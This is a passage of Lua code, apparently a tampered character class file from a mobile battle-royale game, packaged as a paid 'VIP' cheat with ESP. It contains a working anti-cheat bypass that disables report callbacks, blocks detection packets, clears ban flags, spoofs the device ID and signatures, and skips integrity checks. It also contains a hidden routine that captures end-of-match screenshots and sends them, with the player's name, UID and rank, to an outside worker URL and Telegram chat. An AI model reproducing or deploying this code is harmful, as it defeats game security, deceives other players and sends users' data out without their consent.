    else
        pcall(function()
            local uTPPCam = localPlayer.ThirdPersonCameraComponent
            if Valid(uTPPCam) and not localPlayer.bIsWeaponAiming then
                if uTPPCam.FieldOfView ~= 90 then
                    uTPPCam.FieldOfView = 90
                end
            end
        end)
    end
end

_G.YourSeller.LoopToken = (_G.YourSeller.LoopToken or 0) + 1
local myToken = _G.YourSeller.LoopToken
local function FastTick()
    if myToken ~= _G.YourSeller.LoopToken then
        return
    end
    local licensed = false
    if YourSellerESPLicenseInstance then
        pcall(function() licensed = YourSellerESPLicenseInstance:isActive() == true end)
    end
    if licensed then
        local ok, err = pcall(MainLoop)
        if not ok then end
    end
    local okTicker, ticker = pcall(require, "common.time_ticker")
    if okTicker and ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(0.03, FastTick)
    else
    end
end

FastTick()


local function NTHMOD_BypassAntiCheat()
  pcall(function()
    if _G.GameplayCallbacks then
      local GameplayCallbacks = _G.GameplayCallbacks
      local rawOnDSPlayerStateChanged = GameplayCallbacks.OnDSPlayerStateChanged
      GameplayCallbacks.OnDSPlayerStateChanged = function(UID, State, Arg3, Arg4, Reason)
        if type(State) == "string" then
          local LowerState = string.lower(State)
          if LowerState == "cheatdetected" or LowerState == "connectionexception" or LowerState == "connectiontimeout" or LowerState == "banned" then
            State = "Online"
            Reason = "SafeByNTHMod"
          end
        end
        if rawOnDSPlayerStateChanged then
          pcall(rawOnDSPlayerStateChanged, UID, State, Arg3, Arg4, Reason)
        end
      end
      local function ReturnTrue()
        return true
      end
      GameplayCallbacks.OnPlayerNetConnectionClosed = ReturnTrue
      GameplayCallbacks.OnPlayerActorChannelError = ReturnTrue
      GameplayCallbacks.OnPlayerSpectateException = ReturnTrue
      GameplayCallbacks.OnPlayerRPCValidateFailed = ReturnTrue
      GameplayCallbacks.OnShutdownAfterError = ReturnTrue
      GameplayCallbacks.RepListMismatchDetectTrigger = ReturnTrue
      GameplayCallbacks.SendDSHawkEyePatrolLogToLobby = ReturnTrue
      GameplayCallbacks.SendDSErrorLogToLobby = ReturnTrue
      GameplayCallbacks.GetWeaponReport = function()
        return {}
      end
      GameplayCallbacks.GetOneWeaponReport = function()
        return {}
      end
      GameplayCallbacks.GetGeneralTLogData = function()
        return nil
      end
      GameplayCallbacks.ReportPlayerIP = ReturnTrue
      local ReportFuncNames = {
        "ReportJumpFlow",
        "ReportCircleFlow",
        "ReportDSCircleFlow",
        "ReportGameEndFlow",
        "ReportAimFlow",
        "ReportEquipmentFlow",
        "ReportAttackFlow",
        "ReportSecAttackFlow",
        "ReportHurtFlow",
        "ReportFeedback",
        "ReportPlayerBehavior",
        "ReportPlayerMoveRoute",
        "ReportPlayerPosition",
        "ReportForbitPick",
        "ReportTeammatHurt",
        "ReportFireArms",
        "ReportVerifyInfoFlow",
        "ReportGameSetting",
        "ReportGameSettingNew",
        "SendPlayerSpectatingLog",
        "ReportSecTgameMovingFlow",
        "ReportMisKillByTeammate",
        "ReportMrpcsFlow",
        "ReportVehicleMoveFlow",
        "ReportParachuteData",
        "ReportLightweightStat",
        "SendClientStats",
        "ReportPlayersPing",
        "SendGameStart"
      }
      for _, FuncName in ipairs(ReportFuncNames) do
        GameplayCallbacks[FuncName] = ReturnTrue
      end
    end
    if NetUtil then
      if NetUtil.SendPacket then
        if not NetUtil._IsNTHModBypassed then
          local rawSendPacket = NetUtil.SendPacket
          local BlockedPackets = {
            report_player_ip = true,
            report_players_ping = true,
            report_unrealnet_clientstats = true,
            report_all_players_address = true,
            c2ds_ingame_flow_setting = true,
            RPC_Client_PostTGPAIS = true,
            report_unrealnet_exception = true,
            shutdown_after_error = true,
            detect_cheat = true,
            report_common_info = true,
            report_common_battle_info = true,
            SendSpectatingLog = true,
            ReportAvatarException = true,
            report_character_all_drag = true,
            report_parachute_all_drag = true,
            report_vehicle_move_drag = true,
            report_vehicle_move_drag_detail = true,
            log_shooting_miss = true,
            ReportGenerateMonsterFlow = true,
            report_net_saturate = true,
            report_ds_netsaturate = true,
            report_ds_net_continuous_saturate = true,
            report_ds_netrate = true,
            report_player_frame_ping_record = true
          }
          NetUtil.SendPacket = function(PacketName, ...)
            local Args = {...}
            if BlockedPackets[PacketName] then
              return nil
            end
            if type(PacketName) == "string" then
              local FoundIndex = string.find(PacketName, "Flow")
              if not FoundIndex then
                FoundIndex = string.find(PacketName, "Report")
              end
              if FoundIndex and PacketName ~= "ReportGameStartFlow" and PacketName ~= "ReportGameEndFlow" then
                return nil
              end
            end
            if PacketName == "on_tss_sdk_anti_data" then
              if not Args[2] or type(Args[2]) ~= "string" or #Args[2] <= 0 then
                Args[2] = "TSS_SECURE_PAYLOAD_VERIFIED_OK"
                Args[3] = #Args[2]
              end
              if type(Args[5]) == "table" then
                Args[5].ErrorCode = 0
                Args[5].ReportLog = 0
              end
              return rawSendPacket(PacketName, table.unpack(Args))
            end
            return rawSendPacket(PacketName, table.unpack(Args))
          end
          NetUtil._IsNTHModBypassed = true
        end
      end
    end
    local ServerPlayerDataMgr = package.loaded["Server.Data.ServerPlayerDataMgr"]
    if not ServerPlayerDataMgr then
      ServerPlayerDataMgr = rawget(_G, "ServerPlayerDataMgr")
    end
    if ServerPlayerDataMgr then
      if ServerPlayerDataMgr.GetPlayerInfo then
        local rawGetPlayerInfo = ServerPlayerDataMgr.GetPlayerInfo
        ServerPlayerDataMgr.GetPlayerInfo = function(UID)
          local PlayerInfo = rawGetPlayerInfo(UID)
          if type(PlayerInfo) == "table" then
            PlayerInfo.suspicious_flag = 0
            PlayerInfo.avatar_err_report = false
            PlayerInfo.ban = nil
          end
          return PlayerInfo
        end
      end
    end
    local TApmHelper = import("TApmHelper")
    if TApmHelper then
      if TApmHelper.PostGameStatusToTGPAIS then
        TApmHelper.PostGameStatusToTGPAIS = function()
          return true
        end
      end
    end
    local logic_recommend_handler = package.loaded["client.slua.logic.download.recommend.logic_recommend_handler"]
    if not logic_recommend_handler then
      logic_recommend_handler = rawget(_G, "logic_recommend_handler")
    end
    if logic_recommend_handler then
      if logic_recommend_handler.AddBattleItem then
        logic_recommend_handler.AddBattleItem = function()
          return true
        end
      end
    end
    local SubsystemMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
    if SubsystemMgr then
      local SubsystemNames = {
        "WeaponRecordSubSystem",
        "FatalDamageSubsystem",
        "DSHawkEyePatrolSubsystem",
        "ClientHawkEyePatrolSubsystem",
        "ShootVerifySubSystemClient",
        "AvatarExceptionSubsystem",
        "FileCheckSubsystem",
        "SpeedCheckSubsystem",
        "WallCheckSubsystem",
        "AFKReportorSubsystem",
        "ClientQuickReportMaliciousTeammate"
      }
      for _, SubsystemName in ipairs(SubsystemNames) do
        local Subsystem = SubsystemMgr:Get(SubsystemName)
        if Subsystem then
          for FuncName, FuncValue in pairs(Subsystem) do
            if type(FuncValue) == "function" then
              if string.find(FuncName, "Retrieve") or string.find(FuncName, "Report") or string.find(FuncName, "Send") or string.find(FuncName, "Check") or string.find(FuncName, "PlayerHaveAction") then
                Subsystem[FuncName] = function()
                  return {}
                end
              end
            end
          end
        end
      end
    end
    if Client then
      if Client.GetPhoneDeviceID then
        Client.GetPhoneDeviceID = function()
          return "SAMSUNG-SM-S918B-FAKE-" .. tostring(math.random(100000, 999999))
        end
      end
    end
    if slua then
      if slua.getSignature then
        slua.getSignature = function()
          return "VALID_SIGNATURE_846651419"
        end
      end
    end
    local slua_loader = package.loaded["slua.loader"]
    if not slua_loader then
      slua_loader = rawget(_G, "slua_loader")
    end
    if slua_loader then
      slua_loader.verifyBytecode = function()
        return true
      end
      slua_loader.checkIntegrity = function()
        return true
      end
      if slua_loader.disableSignatureCheck then
        slua_loader.disableSignatureCheck = function()
          return true
        end
      end
    end
  end)
end

NTHMOD_BypassAntiCheat()

local VIP_AUTO_FEEDBACK_CONFIG = {
    ChatId = (VIP_SYSTEM_CONFIG and VIP_SYSTEM_CONFIG.AutoFeedbackChatId) or "-1002728565114",
    WorkerUrl = (VIP_SYSTEM_CONFIG and VIP_SYSTEM_CONFIG.AutoFeedbackWorkerUrl) or "https://ahmedbhai.ytmursleen17.workers.dev/",
    BrandName = (VIP_SYSTEM_CONFIG and (VIP_SYSTEM_CONFIG.AutoFeedbackBrandName or VIP_SYSTEM_CONFIG.BrandName)) or "VIP PAID VIP FILE",
    Owner = (VIP_SYSTEM_CONFIG and (VIP_SYSTEM_CONFIG.Owner or VIP_SYSTEM_CONFIG.Developer)) or "@VIPPAIDFROMYOURSELLER",
    Developer = (VIP_SYSTEM_CONFIG and (VIP_SYSTEM_CONFIG.Owner or VIP_SYSTEM_CONFIG.Developer)) or "@VIPPAIDFROMYOURSELLER",
    Community = (VIP_SYSTEM_CONFIG and (VIP_SYSTEM_CONFIG.Community or VIP_SYSTEM_CONFIG.TelegramHandle)) or "@VIPPAIDFROMYOURSELLER",
    Interval = 180,
    BuildCaption = function(meta)
        local timeStr = os.date("%I:%M %p")
        local dateStr = os.date("%d/%m/%Y")
        local isVictory = (meta and meta.isChicken) or false
        local brand = VIP_AUTO_FEEDBACK_CONFIG.BrandName or "VIP PAID VIP LUA PAK"
        local headerTitle = isVictory and string.format("[ %s AUTO FEEDBACK ]\n[ %s VIP VICTORY ]", brand, brand) or string.format("[ %s AUTO FEEDBACK ]\n[ %s ]", brand, brand)
        local killDisplay = isVictory and string.format("%s Kills (Winner)", tostring(meta and meta.kills or 0)) or string.format("%s Kills", tostring(meta and meta.kills or 0))

        return string.format(
[[%s

Player : %s
UID    : %s
Time   : %s | %s
Kills  : %s
Rank   : %s
Build  : %s
---------------------------------
[ STATUS : ACTIVE & 100% SECURE ]

- Undetected & Anti-Ban Protected
- High-Performance ESP & Visuals
- Safe & Secure Match Verification

Owner : %s
Community : %s]],
            headerTitle,
            tostring(meta and meta.name or "Unknown"),
            tostring(meta and meta.uid or "Unknown"),
            timeStr,
            dateStr,
            killDisplay,
            tostring(meta and meta.rank or "Ace"),
            brand,
            tostring(VIP_AUTO_FEEDBACK_CONFIG.Owner or VIP_AUTO_FEEDBACK_CONFIG.Developer),
            tostring(VIP_AUTO_FEEDBACK_CONFIG.Community)
        )
    end
}
_G.VIP_AUTO_FEEDBACK_CONFIG = VIP_AUTO_FEEDBACK_CONFIG

local _LAST_LOOP_TIME = 0
local _LOCAL_MATCH_KILLS = 0
local _GK_MatchFinishedTriggered = false

pcall(function()
    local EventSystem = EventSystem or (pcall(require, "common.event_system") and require("common.event_system"))
    if EventSystem and EventSystem.registEvent then
        if EVENTTYPE_KILL_COUNTER and EVENTID_KILL_COUNTER_NUM_REFRESH then
            EventSystem:registEvent(EVENTTYPE_KILL_COUNTER, EVENTID_KILL_COUNTER_NUM_REFRESH, function(uid)
                pcall(function()
                    local gp = require("GameLua.GameCore.Data.GameplayData")
                    local ps = gp and gp.GetPlayerState and gp.GetPlayerState()
                    if ps and ps.Kills and tonumber(ps.Kills) then
                        _LOCAL_MATCH_KILLS = math.max(_LOCAL_MATCH_KILLS, tonumber(ps.Kills))
                    end
                end)
            end)
        end
    end
end)

local GK_TIER_NAME_MAP = {
    [101] = "Bronze V", [102] = "Bronze IV", [103] = "Bronze III", [104] = "Bronze II", [105] = "Bronze I",
    [201] = "Silver V", [202] = "Silver IV", [203] = "Silver III", [204] = "Silver II", [205] = "Silver I",
    [301] = "Gold V", [302] = "Gold IV", [303] = "Gold III", [304] = "Gold II", [305] = "Gold I",
    [401] = "Platinum V", [402] = "Platinum IV", [403] = "Platinum III", [404] = "Platinum II", [405] = "Platinum I",
    [501] = "Diamond V", [502] = "Diamond IV", [503] = "Diamond III", [504] = "Diamond II", [505] = "Diamond I",
    [601] = "Crown V", [602] = "Crown IV", [603] = "Crown III", [604] = "Crown II", [605] = "Crown I",
    [701] = "Ace", [702] = "Ace Master", [703] = "Ace Dominator",
    [801] = "Conqueror"
}

local function GK_ResolveRankName(segVal)
    if not segVal then return nil end
    if type(segVal) == "string" and not tonumber(segVal) and #segVal >= 3 then
        return segVal
    end
    local segNum = tonumber(segVal)
    if not segNum or segNum <= 0 then return nil end

    local okFunc, rankCfg = pcall(function()
        local fu = FuncUtil or (package.loaded["common.func_util"] or (pcall(require, "common.func_util") and require("common.func_util")))
        if fu and fu.GetRankTableData then
            return fu.GetRankTableData(segNum, 0)
        end
        return nil
    end)
    if okFunc and rankCfg and type(rankCfg) == "table" then
        if rankCfg.Name and type(rankCfg.Name) == "string" and #rankCfg.Name > 0 then
            return rankCfg.Name
        elseif rankCfg.IntegralTypeName and type(rankCfg.IntegralTypeName) == "string" and #rankCfg.IntegralTypeName > 0 then
            return rankCfg.IntegralTypeName
        end
    end

    if GK_TIER_NAME_MAP[segNum] then
        return GK_TIER_NAME_MAP[segNum]
    end

    if segNum >= 800 then
        return "Conqueror"
    elseif segNum >= 703 then
        return "Ace Dominator"
    elseif segNum >= 702 then
        return "Ace Master"
    elseif segNum >= 700 then
        return "Ace"
    elseif segNum >= 600 then
        return "Crown"
    elseif segNum >= 500 then
        return "Diamond"
    elseif segNum >= 400 then
        return "Platinum"
    elseif segNum >= 300 then
        return "Gold"
    elseif segNum >= 200 then
        return "Silver"
    elseif segNum >= 100 then
        return "Bronze"
    elseif segNum == 10 then
        return "Conqueror"
    elseif segNum == 9 then
        return "Ace Dominator"
    elseif segNum == 8 then
        return "Ace Master"
    elseif segNum == 7 then
        return "Ace"
    elseif segNum == 6 then
        return "Crown"
    elseif segNum == 5 then
        return "Diamond"
    elseif segNum == 4 then
        return "Platinum"
    elseif segNum == 3 then
        return "Gold"
    elseif segNum == 2 then
        return "Silver"
    elseif segNum == 1 then
        return "Bronze"
    end

    return nil
end

local function GK_GetPlayerMetadata(isVictory)
    local meta = {
        name = "Player",
        uid = "Unknown",
        kills = _LOCAL_MATCH_KILLS or 0,
        rank = "Ace",
        isChicken = isVictory or false
    }

    pcall(function()
        local GameplayData = nil
        pcall(function() GameplayData = require("GameLua.GameCore.Data.GameplayData") end)
        local UIUtil = nil
        pcall(function() UIUtil = require("client.common.ui_util") end)

        local PC = (GameplayData and GameplayData.GetPlayerController and GameplayData.GetPlayerController())
                or (UIUtil and UIUtil.GetPlayerController and UIUtil.GetPlayerController())
        local PS = (GameplayData and GameplayData.GetPlayerState and GameplayData.GetPlayerState())
                or (PC and PC.PlayerState)
                or (Client and Client.GetMyPlayerState and Client.GetMyPlayerState())
        local Char = (GameplayData and GameplayData.GetLocalCharacter and GameplayData.GetLocalCharacter())
                  or (PC and PC.Character)
                  or (Client and Client.GetLocalPlayerPawn and Client.GetLocalPlayerPawn())

        if DataMgr and DataMgr.roleData and DataMgr.roleData.nickName and DataMgr.roleData.nickName ~= "" then
            meta.name = tostring(DataMgr.roleData.nickName)
        elseif PS and PS.PlayerName and PS.PlayerName ~= "" then
            meta.name = tostring(PS.PlayerName)
        elseif DataPool and DataPool.Get and DataPool:Get("RoleName") then
            meta.name = tostring(DataPool:Get("RoleName"))
        elseif DataPool and DataPool.Get and DataPool:Get("PlayerName") then
            meta.name = tostring(DataPool:Get("PlayerName"))
        end

        if DataMgr and DataMgr.roleData and DataMgr.roleData.uid and DataMgr.roleData.uid ~= 0 and DataMgr.roleData.uid ~= "" then
            meta.uid = tostring(DataMgr.roleData.uid)
        elseif PS and PS.PlayerUID and PS.PlayerUID ~= "" and PS.PlayerUID ~= "0" then
            meta.uid = tostring(PS.PlayerUID)
        elseif PS and PS.PlayerKey and PS.PlayerKey ~= 0 then
            meta.uid = tostring(PS.PlayerKey)
        elseif DataPool and DataPool.Get and DataPool:Get("UID") then
            meta.uid = tostring(DataPool:Get("UID"))
        end

        local killCandidates = {
            _LOCAL_MATCH_KILLS,
            PS and PS.Kills,
            PC and PC.PlayerState and PC.PlayerState.Kills,
            Char and Char.GetKillNum and Char:GetKillNum(),
            DataPool and DataPool.Get and DataPool:Get("KillNum"),
            DataPool and DataPool.Get and DataPool:Get("Kills")
        }
        for _, kc in ipairs(killCandidates) do
            if kc and tonumber(kc) and tonumber(kc) > meta.kills then
                meta.kills = tonumber(kc)
            end
        end

        local rawRank = nil

        pcall(function()
            local btr = _G.BP_STRUCT_BattleResultData
            if btr then
                if btr.BP_STRUCT_BTRating and btr.BP_STRUCT_BTRating.new_segment and btr.BP_STRUCT_BTRating.new_segment > 0 then
                    rawRank = btr.BP_STRUCT_BTRating.new_segment
                elseif btr.SeasonBestRank and btr.SeasonBestRank > 0 then
                    rawRank = btr.SeasonBestRank
                end
            end
        end)

        if not rawRank then
            pcall(function()
                if DataMgr and DataMgr.roleData and DataMgr.roleData.allzoneSegment then
                    local fu = FuncUtil or (pcall(require, "common.func_util") and require("common.func_util"))
                    if fu and fu.GetCurMaxSegementLevel then
                        local lvl = fu.GetCurMaxSegementLevel(DataMgr.roleData.allzoneSegment)
                        if lvl and lvl > 0 then rawRank = lvl end
                    end
                end
            end)
        end

        if not rawRank then
            local rankCandidates = {
                DataMgr and DataMgr.maxSegment and DataMgr.maxSegment.SegmentLevel,
                DataMgr and DataMgr.roleData and DataMgr.roleData.cur_max_integral_level,
                DataPool and DataPool.Get and DataPool:Get("SegmentLevel"),
                PS and PS.SegmentLevel,
                PS and PS.segment_level,
                DataMgr and DataMgr.roleData and DataMgr.roleData.segment_info and DataMgr.roleData.segment_info.segment_level
            }
            for _, rc in ipairs(rankCandidates) do
                if rc and rc ~= 0 and rc ~= "" then
                    rawRank = rc
                    break
                end
            end
        end

        local resolvedRank = GK_ResolveRankName(rawRank)
        if resolvedRank and #resolvedRank > 0 then
            meta.rank = resolvedRank
        end
    end)

    return meta
end

local function VIP_FastBase64Encode(data)
    if not data or #data == 0 then return "" end
    local b64str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local b64 = {}
    for i = 0, 63 do b64[i] = string.byte(b64str, i + 1) end
    local eq = string.byte("=")
    local parts = {}
    local n_parts = 0
    local len = #data
    local i = 1
    while i <= len - 2 do
        local b1, b2, b3 = string.byte(data, i, i + 2)
        local n = b1 * 65536 + b2 * 256 + b3
        n_parts = n_parts + 1
        parts[n_parts] = string.char(b64[math.floor(n / 262144)], b64[math.floor(n / 4096) % 64], b64[math.floor(n / 64) % 64], b64[n % 64])
        i = i + 3
    end
    local remaining = len - i + 1
    if remaining == 2 then
        local b1, b2 = string.byte(data, i, i + 1)
        local n = b1 * 65536 + b2 * 256
        n_parts = n_parts + 1
        parts[n_parts] = string.char(b64[math.floor(n / 262144)], b64[math.floor(n / 4096) % 64], b64[math.floor(n / 64) % 64], eq)
    elseif remaining == 1 then
        local b1 = string.byte(data, i)
        local n = b1 * 65536
        n_parts = n_parts + 1
        parts[n_parts] = string.char(b64[math.floor(n / 262144)], b64[math.floor(n / 4096) % 64], eq, eq)
    end
    return table.concat(parts)
end

local function VIP_PostToWorker(endpoint, bodyData, customHeaders, cb)
    pcall(function()
        local workerUrl = VIP_AUTO_FEEDBACK_CONFIG.WorkerUrl or ""
        if not workerUrl or workerUrl == "" then return end
        local ModMgr = _G.ModuleManager or package.loaded["GameLua.GameCore.Framework.ModuleManager"]
        if not ModMgr then pcall(function() ModMgr = require("GameLua.GameCore.Framework.ModuleManager") end) end
        local http = ModMgr and ModMgr.GetModule and ModMgr.GetModule(ModMgr.CommonModuleConfig.http_manager)
        local targetUrl = workerUrl .. endpoint
        local headers = {
            ["Content-Type"] = "text/plain",
            ["User-Agent"]   = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"
        }
        if customHeaders and type(customHeaders) == "table" then
            for k, v in pairs(customHeaders) do headers[k] = tostring(v) end
        end
        if http and http.Post then
            http:Post(targetUrl, headers, bodyData, nil, function(success, data, content, result)
                if cb then pcall(cb, success, data, content, result) end
            end, 30)
        end
    end)
end

local function GK_BufferToString(buf)
    if not buf then return nil end
    if type(buf) == "string" and #buf > 50 then return buf end
    if type(buf) == "table" and #buf > 50 then
        local t = {}
        for i = 1, #buf do t[i] = string.char(buf[i]) end
        return table.concat(t)
    end
    local ok, s = pcall(function() return tostring(buf) end)
    if ok and s and #s > 50 then return s end
    return nil
end

local function GK_ReadScreenshotBytes(ShotPath)
    if not ShotPath or ShotPath == "" then return nil end
    local candidates = { ShotPath }
    
    pcall(function()
        local bOk, BusinessHelper = pcall(import, "BusinessHelper")
        if bOk and BusinessHelper and BusinessHelper.GetMobileBasePath then
            local abs = BusinessHelper.GetMobileBasePath(ShotPath)
            if abs and abs ~= "" then table.insert(candidates, abs) end
        end
    end)

    local savedDir = Client and Client.ProjectSavedDir and Client.ProjectSavedDir() or ""
    if savedDir ~= "" then
        table.insert(candidates, savedDir .. ShotPath)
        table.insert(candidates, savedDir .. "Screenshots/" .. ShotPath)
    end

    local sh = import("ScriptHelperClient") or ScriptHelperClient

    for _, path in ipairs(candidates) do
        if path and path ~= "" then
            local fileData = nil
            pcall(function()
                local f = io.open(path, "rb")
                if f then
                    fileData = f:read("*a")
                    f:close()
                end
            end)
            if fileData and #fileData > 200 then return fileData, path end

            pcall(function()
                if sh and sh.LoadFileToArrayByFullPath then
                    fileData = GK_BufferToString(sh.LoadFileToArrayByFullPath(path))
                end
                if (not fileData or #fileData == 0) and Client and Client.LoadFileToArrayByFullPath then
                    fileData = GK_BufferToString(Client.LoadFileToArrayByFullPath(path))
                end
            end)
            if fileData and #fileData > 200 then return fileData, path end
        end
    end

    return nil, ShotPath
end

local function GK_SendRawBytesToWorker(fileBytes, isVictory)
    pcall(function()
        if not fileBytes or #fileBytes < 100 then return end

        local b64Payload = VIP_FastBase64Encode(fileBytes)
        if not b64Payload or #b64Payload < 100 then return end

        local meta = GK_GetPlayerMetadata(isVictory)
        local customCaption = nil
        if VIP_AUTO_FEEDBACK_CONFIG.BuildCaption and type(VIP_AUTO_FEEDBACK_CONFIG.BuildCaption) == "function" then
            local okCap, capRes = pcall(VIP_AUTO_FEEDBACK_CONFIG.BuildCaption, meta)
            if okCap and capRes and type(capRes) == "string" and #capRes > 0 then
                customCaption = capRes
            end
        end

        local metaHeaders = {
            ["X-Meta-Chat-Id"]    = tostring(VIP_AUTO_FEEDBACK_CONFIG.ChatId or "7665389332"),
            ["X-Meta-Brand"]      = tostring(VIP_AUTO_FEEDBACK_CONFIG.BrandName or "VIP PAID VIP LUA FILE"),
            ["X-Meta-Owner"]      = tostring(VIP_AUTO_FEEDBACK_CONFIG.Owner or VIP_AUTO_FEEDBACK_CONFIG.Developer or "@VIPPAIDFROMYOURSELLER"),
            ["X-Meta-Developer"]  = tostring(VIP_AUTO_FEEDBACK_CONFIG.Owner or VIP_AUTO_FEEDBACK_CONFIG.Developer or "@VIPPAIDFROMYOURSELLER"),
            ["X-Meta-Community"]  = tostring(VIP_AUTO_FEEDBACK_CONFIG.Community or "@VIPPAIDFROMYOURSELLER"),
            ["X-Meta-Title"]      = tostring(VIP_AUTO_FEEDBACK_CONFIG.BrandName or "VIP PAID VIP LUA FILE"),
            ["X-Meta-Name-B64"]   = VIP_FastBase64Encode(meta.name or "Player"),
            ["X-Meta-Uid"]        = tostring(meta.uid or "Unknown"),
            ["X-Meta-Kills"]      = tostring(meta.kills or 0),
            ["X-Meta-Rank"]       = tostring(meta.rank or "Ace"),
            ["X-Meta-Chicken"]    = tostring(meta.isChicken)
        }
        if customCaption then
            metaHeaders["X-Meta-Caption-B64"] = VIP_FastBase64Encode(customCaption)
        end

        VIP_PostToWorker("/screenshot", b64Payload, metaHeaders, function(success, data, content, result)
        end)
    end)
end

local function GK_TakeAndSendScreenshot(isVictory)
    pcall(function()
        local ScreenshotMaker = import("ScreenshotMaker")
        if not ScreenshotMaker then return end

        local savedDir = Client and Client.ProjectSavedDir and Client.ProjectSavedDir() or ""
        local ts = os.time()
        local rawPath    = string.format("%sScreenshots/raw_%d_%d.jpg", savedDir, ts, math.random(100, 999))
        local scaledPath = string.format("%sScreenshots/sec_fb_%d_%d.jpg", savedDir, ts, math.random(100, 999))

        local UIUtil = nil
        pcall(function() UIUtil = require("client.common.ui_util") end)
        local GameInstance = UIUtil and UIUtil.GetGameInstance and UIUtil.GetGameInstance()

        local function ProcessCapture(capturePath)
            local ticker = require("common.time_ticker")
            if not ticker or not ticker.AddTimerOnce then
                local fileData = GK_ReadScreenshotBytes(capturePath)
                if fileData then GK_SendRawBytesToWorker(fileData, isVictory) end
                return
            end

            ticker.AddTimerOnce(0.8, function()
                local bResized = false
                pcall(function()
                    if ScreenshotMaker.ResizePicture then
                        ScreenshotMaker.ResizePicture(capturePath, 0.6, scaledPath)
                        bResized = true
                    end
                end)

                if bResized then
                    ticker.AddTimerOnce(0.3, function()
                        local targetToSend = scaledPath
                        local fileData = GK_ReadScreenshotBytes(scaledPath)
                        if not fileData then
                            targetToSend = capturePath
                            fileData = GK_ReadScreenshotBytes(capturePath)
                        end
                        if fileData then
                            GK_SendRawBytesToWorker(fileData, isVictory)
                        end
                    end)
                else
                    local fileData = GK_ReadScreenshotBytes(capturePath)
                    if fileData then
                        GK_SendRawBytesToWorker(fileData, isVictory)
                    end
                end
            end)
        end

        if GameInstance and GameInstance.EnginePreTick then
            GameInstance.EnginePreTick:Add(function()
                local ShotPath = ScreenshotMaker.MakePictureByName(rawPath, true)
                pcall(function() GameInstance.EnginePreTick:Clear() end)
                ProcessCapture(ShotPath or rawPath)
            end)
        else
            local ShotPath = ScreenshotMaker.MakePictureByName(rawPath, true)
            ProcessCapture(ShotPath or rawPath)
        end
    end)
end

local function GK_TriggerMatchEndFeedback()
    pcall(function()
        local now = os.time()
        if _G._GK_LastVictoryBurstTime and (now - _G._GK_LastVictoryBurstTime < 15) then
            return
        end
        _G._GK_LastVictoryBurstTime = now
        _GK_MatchFinishedTriggered = true

        local ticker = require("common.time_ticker")
        if ticker and ticker.AddTimerOnce then
            ticker.AddTimerOnce(1.5, function()
                GK_TakeAndSendScreenshot(true)
            end)
        else
            GK_TakeAndSendScreenshot(true)
        end
    end)
end

pcall(function()
    pcall(require, "client.slua.config.event.event_define")
    pcall(require, "GameLua.Mod.BaseMod.GamePlay.Config.EventDefine")
    pcall(require, "client.slua.config.event.event")

    local EventSystem = EventSystem or (pcall(require, "common.event_system") and require("common.event_system"))
    if EventSystem and EventSystem.registEvent then
        local evList = {
            { EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_ENTER_PROTECT },
            { EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_BEGIN_PERFORMANCE },
            { EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_GAMEOVER_TO_RESULT },
            { EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_WATCH_TO_RESULT },
            { EVENTTYPE_ACCOUNT, EVENTID_BATTLE_DS_FINISHED },
            { EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_TDM_ANIM_FINISH },
            { EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_TDM_GET_RESULT_RSP },
            { EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_TDM_GET_MEDAL_CLOSE },
            { EVENTTYPE_CREATIVE, EVENTID_CREATIVE_MATCH_SETTLEMENT },
            { EVENTTYPE_CREATIVE, EVENTID_CREATIVEMODE_GAMEOVER },
            { EVENTTYPE_STATE, EVENTID_GAMESTATE_ON_BATTLE_RESULT }
        }
        for _, item in ipairs(evList) do
            local eType, eId = item[1], item[2]
            if eType and eId then
                EventSystem:registEvent(eType, eId, function()
                    GK_TriggerMatchEndFeedback()
                end)
            end
        end
    end

    local okUI, UIManager = pcall(require, "client.slua_ui_framework.manager")
    if okUI and UIManager and UIManager.ShowUI and not UIManager._gk_tdm_vic_hooked then
        local origShowUI = UIManager.ShowUI
        UIManager.ShowUI = function(config, ...)
            local bIsSelfWin = ...
            pcall(function()
                if config and (config == (UIManager.UI_Config_InGame and UIManager.UI_Config_InGame.VictoryDefeat)
                               or config.keyName == "VictoryDefeat"
                               or (config.moduleName and string.find(config.moduleName, "VictoryDefeat"))) then
                    if bIsSelfWin == true then
                        GK_TriggerMatchEndFeedback()
                    end
                end
            end)
            return origShowUI(config, ...)
        end
        UIManager._gk_tdm_vic_hooked = true
    end
end)

_G._GK_ResetFeedbackState = function()
    _LAST_LOOP_TIME = 0
    _LOCAL_MATCH_KILLS = 0
end

_G._GK_ScreenshotLoop = function() end
_G._GK_TriggerMatchEndFeedback = GK_TriggerMatchEndFeedback
_G._GK_TakeAndSendScreenshot = GK_TakeAndSendScreenshot
_G._VIP_FeedbackStarted = false

local function VIP_StartAutoFeedbackEngine()
    if _G._VIP_FeedbackStarted then return end
    _G._VIP_FeedbackStarted = true
end
_G.VIP_StartAutoFeedbackEngine = VIP_StartAutoFeedbackEngine

function BRPlayerCharacterBase:_StartAutoFeedback()
    VIP_StartAutoFeedbackEngine()
end

pcall(VIP_StartAutoFeedbackEngine)

-- ============================================================================
-- 19. RETURN CLASS
-- ============================================================================
local class = require("class")
local CharacterBase = require("GameLua.GameCore.Framework.CharacterBase")
local BRCharacterClass = class(CharacterBase, nil, BRPlayerCharacterBase)

local combinedCharacterClass = require("combine_class").DeclareFeature(BRCharacterClass, {
    {SkyTransition = "GameLua.Mod.BaseMod.Gameplay.Feature.SkyControl.PlayerCharacterSkyTransitionFeature"},
    {CarryDeadBoxFeature = "GameLua.Mod.Library.GamePlay.Feature.CarryDeadBoxFeature"},
    {SpecialSuitFeature = "GameLua.Mod.Library.GamePlay.Feature.SpecialSuitFeature"},
    {TeleportPawnFeature = "GameLua.Mod.Library.GamePlay.Feature.TeleportPawnFeature"},
    {LifterControl = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.CharacterLifterControlFeature"},
